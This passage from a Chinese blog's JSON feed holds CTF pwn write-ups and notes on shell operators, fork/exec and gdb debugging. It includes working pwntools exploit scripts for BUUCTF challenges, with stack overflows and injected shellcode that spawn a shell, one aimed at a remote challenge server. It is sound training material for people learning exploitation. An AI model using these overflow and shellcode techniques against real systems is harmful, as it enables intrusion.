number\">4</span> <span class=\"token comment\">#2 出错，不会执行 echo3 ，echo4</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#前一条命令失败然后才继续执行后面的命令</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span>  <span class=\"token comment\">#当第一个执行成功时，后面的就都不会执行；当第一个命令失败时，就开始执行 echo2，后面同理</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#混合使用分隔符</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">echo</span> <span class=\"token number\">1</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">2</span> <span class=\"token operator\">||</span> <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">3</span> <span class=\"token operator\">&amp;&amp;</span>  <span class=\"token builtin class-name\">echo</span> <span class=\"token number\">4</span>  <span class=\"token comment\"># 因为 || 分隔符，按照 顺序 只要前面三个执行成功一个其他的就不执行，然后执行 echo4（因为 &amp;&amp; 前面的被看作一个整体，一个成功就视为成功，就执行 echo 4）</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JhbmRhb3l1L2FydGljbGUvZGV0YWlscy8xMTcyOTY5MDc=\">https://blog.csdn.net/bandaoyu/article/details/117296907</span></p>\n<h1 id=\"2命令输出重定向\"><a class=\"anchor\" href=\"#2命令输出重定向\">#</a> 2. 命令输出重定向</h1>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"><span>l</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">></span>  <span class=\"token function\">file</span> <span class=\"token comment\">#将命令执行结果输出到 file 中，命令的输出结果覆盖原有文件的内容（会清空旧内容）</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">>></span>  <span class=\"token function\">file</span> <span class=\"token comment\">#将命令的输出结果输出到 file 文件的原内容的下一行</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">command</span>  <span class=\"token operator\">&lt;</span>  <span class=\"token function\">file</span> <span class=\"token comment\"># 将输入重定向到 file</span></pre></td></tr></table></figure><p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9saW51eC9saW51eC1zaGVsbC1pby1yZWRpcmVjdGlvbnMuaHRtbA==\">https://www.runoob.com/linux/linux-shell-io-redirections.html</span></p>\n<h1 id=\"3fork函数\"><a class=\"anchor\" href=\"#3fork函数\">#</a> 3.fork () 函数</h1>\n<p>fork 函数用于创建一个进程，所创建的进程 <strong>复制父进程的代码段 / 数据段 / BSS 段 / 堆 / 栈等所有用户空间信息</strong> ；在内核中操作系统重新为其申请了一个 PCB，并使用父进程的 PCB 进行初始化；</p>\n<p>父进程与子进程的 pid 不同，<strong>执行顺序也不一定，要看系统的进程调度策略</strong></p>\n<p>fork 被调用一次会返回两次（后面的语句也就判断 2 次），返回 0 代表其是子进程，而在父进程中接到的返回值是子进程的 pid，fork 为负值代表出现错误</p>\n<p>fork 调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：</p>\n<ol>\n<li>\n<pre><code>在父进程中，fork返回新创建子进程的进程ID；\n</code></pre>\n</li>\n<li>\n<pre><code>在子进程中，fork返回0；\n</code></pre>\n</li>\n<li>\n<p>如果出现错误，fork 返回一个负值；</p>\n<p>子进程的 fork（）返回值为 0  #第一次返回（不分先后，第一次返回也可能是父进程的 fork）<br />\n父进程的 fork（）返回值为子进程的 pid  #第二次返回</p>\n</li>\n</ol>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Nja2x1di9hcnRpY2xlL2RldGFpbHMvMTA5MTY5OTQx\">https://blog.csdn.net/cckluv/article/details/109169941</span></p>\n<h1 id=\"4linux下的exec命令\"><a class=\"anchor\" href=\"#4linux下的exec命令\">#</a> 4.Linux 下的 exec 命令</h1>\n<ol>\n<li>在一个 shell 里面，执行 <code>exec ls；</code> 那么，当列出了当前目录后，这个 shell 就自己退出了，因为这个 <code>shell进程已被替换为仅仅执行ls命令的一个进程</code> ，执行结束自然也就退出了 。</li>\n<li>exec 文件重定向，可以将文件的重定向就看为是 shell 程序的文件重定向， <code>当exec命令来对文件描述符操作的时候，就不会替换shell，而且操作完成后，还会继续执行接下来的命令。</code></li>\n</ol>\n<p>应用：可以 <code>重新开启标准输出流</code> ：</p>\n<p><code>exec （cat [文件名]）1&gt;&amp;0</code> , 使文件的标准输出流到标准输入里 (在 Linux 系统中文件描述符 <code>1为标准输出流，0为标准输入流，2为标准错误（输出到屏幕）</code> ，而通过 <code>&amp;+文件描述符</code> 的方式可以代替文件名，（这里就指向了该终端，所以结果显示在终端上 <code>因为默认打开一个终端后，0，1，2都指向该终端</code> ）</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYnVsaC9hcnRpY2xlcy8xMjc2MDYxNy5odG1s\">https://www.cnblogs.com/bulh/articles/12760617.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMxMTg2MTIzL2FydGljbGUvZGV0YWlscy84MjE5MDc3Ng==\">https://blog.csdn.net/qq_31186123/article/details/82190776</span></p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/19/pwn/%E5%88%B7%E9%A2%98/BUUCTF/wustctf2020_getshell/",
            "url": "https://vvwwvv.cn/2023/09/19/pwn/%E5%88%B7%E9%A2%98/BUUCTF/wustctf2020_getshell/",
            "title": "wustctf2020_getshell",
            "date_published": "2023-09-19T07:45:26.695Z",
            "content_html": "<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p>查看程序开启的保护<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP4x3lT.png\" alt=\"\" /><br />\n 32 位程序，没有开启 NX，猜测可以使用 shellcode</p>\n<p>利用 ida 反汇编</p>\n<p>主函数<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP4xr6O.png\" alt=\"\" /><br />\n init（）：输出图形<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP4x6ne.png\" alt=\"\" /><br />\n vulnerable () ：可以进行溢出，但是溢出范围很小<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/19/pP4xIc8.png\" alt=\"\" /></p>\n<p>发现有后门命令在 shell 函数里</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP4zFE9.png\" alt=\"\" /></p>\n<p>直接溢出执行该命令即可</p>\n<h1 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#p=process('./wustctf2020_getshell')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28324</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"/_/ /_//_\\\\_\\\\ \\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token number\">28</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x804851B</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/09/19/pP4zOqe.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/",
            "url": "https://vvwwvv.cn/2023/09/18/pwn/gdb%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95/",
            "title": "gdb本地调试，基于pwndbg",
            "date_published": "2023-09-18T11:53:15.000Z",
            "content_html": "<h1 id=\"此处用于记录在编写脚本中对程序的调试\"><a class=\"anchor\" href=\"#此处用于记录在编写脚本中对程序的调试\">#</a> 此处用于记录在编写脚本中对程序的调试</h1>\n<p>因为有时要输入不可见字符，导致我们没办法进行直接在 gdb 内调试，所以需要相应的在脚本中调试</p>\n<h2 id=\"1调试方法\"><a class=\"anchor\" href=\"#1调试方法\">#</a> 1. 调试方法：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">\"b *断点地址\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#第一个 pause</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#第二个 pause</span></pre></td></tr></table></figure><p>此处的重点就是在发送 <code>payload</code>  前加入 <code>gdb.attach(p)</code>  和 <code>pause()</code> ，发送 <code>payload</code>  后加入 <code>pause()</code> ，然后在产生的新终端内设置断点（也可以在前面直接设置断点： <code>gdb.attach(p,&quot;b *0x8048600&quot;)</code> ）</p>\n<p>然后新终端内输入 <code>c</code>  继续执行，旧终端内按下回车便可以进行查询得到相应的栈情况</p>\n<p>不知道为什么要加入两个 <code>pause（）</code> 才行，前面一个防止程序直接发送结束，无法加入断点；后面一个不加入会导致无法读取栈的情况（程序貌似没有运行结束，个人猜测是设置断点的地方已经不需要栈了）</p>\n<h2 id=\"2调试例子\"><a class=\"anchor\" href=\"#2调试例子\">#</a> 2. 调试例子：</h2>\n<p>左边为新终端，右边为旧终端（pid 相同）<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4tKjP.png\" alt=\"\" /><br />\n此时已经在代码里设置好了断点，在新终端内输入 <code>c</code> , 旧终端按回车即可</p>\n<p>可以看到已经发送了 <code>payload</code> <br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4tt9s.png\" alt=\"\" /></p>\n<p>可以看到已经发送的内容到了栈上<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4NGqK.png\" alt=\"\" /><br />\n (输入的值是 crashme，由于是小端序所以要倒着读，c 是 63，r 是 72，所以输入的位置是 0x22)</p>\n<p>上述例子具体的代码：</p>\n<pre><code class=\"language-pyhton\">from pwn import *\np=process('./ez_pz_hackover_2016')\ncontext.log_level='debug'\n \ngdb.attach(p)  ## 会在此处再打开一个终端\n# 'b *0x8048600'  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车\n，\np.recvuntil('crash: ')\nstack=int(p.recv(10),16)#接收s在栈上的地址\n\npayload='crashme\\x00'+'aaaaaa'#crashme\\x00绕过if判断      \n\npause()  #必须要在发送的payload前面，不然直接发送结束无法查询了\np.sendline(payload)\n \npause()  #\n</code></pre>\n",
            "tags": [
                "pwn",
                "二进制"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/17/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ez_pz_hackover_2016/",
            "url": "https://vvwwvv.cn/2023/09/17/pwn/%E5%88%B7%E9%A2%98/BUUCTF/ez_pz_hackover_2016/",
            "title": "ez_pz_hackover_2016（shellcode）",
            "date_published": "2023-09-17T14:30:51.512Z",
            "content_html": "<h1 id=\"1查看程序\"><a class=\"anchor\" href=\"#1查看程序\">#</a> 1. 查看程序</h1>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/17/ymMrfyf3.png\" alt=\"\" /><br />\n发现没有开启 NX，有 rwx 段，可以利用 shellcode</p>\n<p>利用 ida 查看<br />\n<img data-src=\"https://img1.imgtp.com/2023/09/17/5VybmqFr.png\" alt=\"\" /></p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/17/cG6l8WkS.png\" alt=\"\" /></p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/17/Aib7xfrT.png\" alt=\"\" /></p>\n<p><img data-src=\"https://img1.imgtp.com/2023/09/17/6xAZOCsq.png\" alt=\"\" /></p>\n<p>因为要写入 shellcode 并执行，所以我们需要利用栈溢出</p>\n<p>chall 函数里的 fget 因为大小限制为 1024（0x400），所以我们无法溢出，但是，该函数末尾有个 vuln（s，0x400），里面的 memcpy 函数会将 s，复制给 dest，且有 0x400 的大小可以进行溢出。</p>\n<p>我们需要绕过 <code>strcmp(s,crashme)</code> , 可以利用 <code>\\x00</code>  截断</p>\n<h1 id=\"2漏洞利用\"><a class=\"anchor\" href=\"#2漏洞利用\">#</a> 2. 漏洞利用</h1>\n<p>我们通过执行 shellcode 来 getshell，通过 <code>vuln</code>  函数中的 <code>memcpy函数</code> 进行复制来导致溢出，让我们返回到 <code>shellcode</code>  的地址，去执行</p>\n<p>由于分配的栈每次都是随机分配的，所以地址是变化的，导致我们需要的 <code>shellcode</code>  地址也是变动的</p>\n<p>偏移量是定值，在 <code>chall</code>  函数中首先会给一个 <code>s</code>  的地址， <code>s</code>  也在栈上（但是在不同的函数栈上），我们可以用得到的 s，加上调试找到的 <code>shellcode</code>  地址算出偏移量，利用固定的偏移量来计算后面的 <code>shellcode</code>  地址</p>\n<p>字符串 s 的地址高地址，要输入的 shellcode 地址为低地址<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4aBHf.png\" alt=\"\" /></p>\n<p><code>offset=0xfffdc7ac-0xfffdc790=0x1c=28</code></p>\n<p>其余只需要用 <code>\\x00</code>  绕过 <code>strcpy()</code>  函数即可</p>\n<p>【注意】</p>\n<p>该题的 <code>dest</code>  栈的偏移在 ida 中有偏差，我们进行手动调试</p>\n<pre><code class=\"language-pyhton\">from pwn import *\np=process('./ez_pz_hackover_2016')\ncontext.log_level='debug'\n \ngdb.attach(p)  ## 会在此处再打开一个终端\n# 'b *0x8048600'  ##在该终端下设置对应断点（要设置在对应函数结束之前），设置完后必须在新终端按下“c”来继续进行，再在旧终端里按下回车\n，\np.recvuntil('crash: ')\nstack=int(p.recv(10),16)#接收s在栈上的地址\n\npayload='crashme\\x00'+'aaaaaa'#crashme\\x00绕过if判断      \n\npause()  #必须要在发送的payload前面，不然直接发送结束无法查询了\np.sendline(payload)\n \npause()  #必要的，不能少\n</code></pre>\n<p>调试步骤见文章 <code>gdb本地调试</code></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/18/pP4d6Z6.png\" alt=\"\" /></p>\n<p>从上图中看到 ebp 地址为 <code>0xfffdc788</code> ,esp <code>0xfffdc750</code> , 相对偏移为 0x38（ebp-esp），我们输入的内容从偏移 0x22 开始（小端序倒着读），从这可以看到我们需要填充的 <code>padding</code>  大小为 0x16+4（0x38-0x22+4）从未输入 crashme 开始算</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"crashme\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>stack_add<span class=\"token operator\">+</span>shellcode <span class=\"token comment\">#减 8 为前面的 \"crashme\\x00\" 的长度 (\\x00 为 1)</span></pre></td></tr></table></figure><h1 id=\"3-exp\"><a class=\"anchor\" href=\"#3-exp\">#</a> 3. exp</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./ez_pz_hackover_2016'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b *0x8048600\")</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"lets crash: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>stack<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset<span class=\"token operator\">=</span><span class=\"token number\">0x1c</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>payload1<span class=\"token operator\">=</span><span class=\"token string\">b\"crashme\\x00\"</span><span class=\"token operator\">+</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>stack<span class=\"token operator\">-</span><span class=\"token number\">0x1c</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>shellcode </pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>打通本地<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4w5hF.md.png\" alt=\"\" /></p>\n<p>得到 flag<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/18/pP4wvtO.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/",
            "url": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow/",
            "title": "CTFshow(Test_your_nc部分,0~4)",
            "date_published": "2023-09-15T03:01:15.000Z",
            "content_html": "<h1 id=\"pwn0\"><a class=\"anchor\" href=\"#pwn0\">#</a> pwn0</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWt1sS.png\" alt=\"\" /></p>\n<p>利用 ssh 连接，不知道为什么之前连接是失败的<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWffpV.png\" alt=\"\" /></p>\n<p>然后输入密码会加载一大堆东西</p>\n<p>而且密码不在当前目录下需要到根目录查看</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWfLfx.png\" alt=\"\" /></p>\n<h1 id=\"pwn1\"><a class=\"anchor\" href=\"#pwn1\">#</a> pwn1</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhgDe.md.png\" alt=\"\" /></p>\n<p>题目里已经说明有后门了，下载附件利用 ida 打开</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhqbQ.png\" alt=\"\" /></p>\n<p>发现输出完句子之后会直接执行 cat flag，那么直接 nc 连接即可<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWhXUs.md.png\" alt=\"\" /></p>\n<h1 id=\"pwn2\"><a class=\"anchor\" href=\"#pwn2\">#</a> pwn2</h1>\n<h2 id=\"题目-3\"><a class=\"anchor\" href=\"#题目-3\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPW4pvT.png\" alt=\"\" /></p>\n<p>下载附件查看程序信息，发现是 64 位程序<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPW4WsU.md.png\" alt=\"\" /></p>\n<p>ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWL4e0.png\" alt=\"\" /><br />\n发现有个 system (/bin/sh), 直接 给权限了，那么就直接可以获取 flag</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWL7YF.png\" alt=\"\" /></p>\n<h1 id=\"pwn3\"><a class=\"anchor\" href=\"#pwn3\">#</a> pwn3</h1>\n<h2 id=\"题目-4\"><a class=\"anchor\" href=\"#题目-4\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWLLl9.png\" alt=\"\" /></p>\n<p>查看保护是 64 位程序，ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWLzTK.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOCfe.png\" alt=\"\" /></p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOFld.png\" alt=\"\" /></p>\n<p>这里考察我们对函数的理解</p>\n<ul>\n<li>put 函数输出的是字符串</li>\n<li>echo 主要用于打印简单的字符串和变量值</li>\n<li>cat 用来查看文件内容，更侧重于处理文件，实现文件内容的读取和拼接等操作</li>\n</ul>\n<p>(只有 system (cat /flag) 输出了 flag，选择 4 只会输出字符串”/ctfshow_flag“)<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOllj.png\" alt=\"\" /></p>\n<h1 id=\"pwn4\"><a class=\"anchor\" href=\"#pwn4\">#</a> pwn4</h1>\n<h2 id=\"题目-5\"><a class=\"anchor\" href=\"#题目-5\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/15/pPWOonI.png\" alt=\"\" /></p>\n<p>查看程序是 64 位，用 ida 打开<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDMex.png\" alt=\"\" /></p>\n<p><code>execve_func()</code>  里有后门<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDlTK.md.png\" alt=\"\" /></p>\n<p><code>strcmp(str1,str2)</code>  该函数会进行比较，str1=str2 时会返回 0，所以输入 <code>CTFshowPWN</code>  以此绕过判断<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfDPe0.png\" alt=\"\" /></p>\n",
            "tags": [
                "pwn",
                "nc"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/",
            "url": "https://vvwwvv.cn/2023/09/15/pwn/%E5%88%B7%E9%A2%98/ctfshow/ctfshow5-34/",
            "title": "CTFshow(前置基础部分-汇编,5~34)",
            "date_published": "2023-09-15T03:01:15.000Z",
            "content_html": "<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzU2Njk2Mzc4L2FydGljbGUvZGV0YWlscy8xMjgwNjc0Mzg=\">https://blog.csdn.net/m0_56696378/article/details/128067438</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTUlQUYlODQlRTUlQUQlOTglRTUlOTklQTglRTUlQUYlQkIlRTUlOUQlODAlRTYlOTYlQjklRTUlQkMlOEYvNjY4NjQwOA==\">https://baike.baidu.com/item/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F/6686408</span></p>\n<h1 id=\"pwn5\"><a class=\"anchor\" href=\"#pwn5\">#</a> pwn5</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfMr7t.png\" alt=\"\" /><br />\n查看查询信息（另一个 asm 文件是用于在 C<ins> 源码中内嵌汇编语言。ASM 能写在任何 C</ins> 合法语句中，asm 还不是 C 的标准关键字）</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQC4K.png\" alt=\"\" /></p>\n<p>32 位程序，利用 ida 打开</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQl8S.png\" alt=\"\" /></p>\n<p>发现是 int 0x80，为系统调用，通过系统调用 write 函数来输出，输出结果即为 flag<br />\n<img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQYbn.png\" alt=\"\" /></p>\n<p>【关于 asm，给我们解释了汇编代码的含义】</p>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPfQB2F.png\" alt=\"\" /><br />\n系统调用（int 0x80）在后面执行，系统调用号在前面</p>\n<h1 id=\"pwn6立即寻址方式\"><a class=\"anchor\" href=\"#pwn6立即寻址方式\">#</a> pwn6（立即寻址方式）</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目</h2>\n<p><img data-src=\"https://z1.ax1x.com/2023/09/16/pPf1WcD.png\" alt=\"\" /><br />\n32 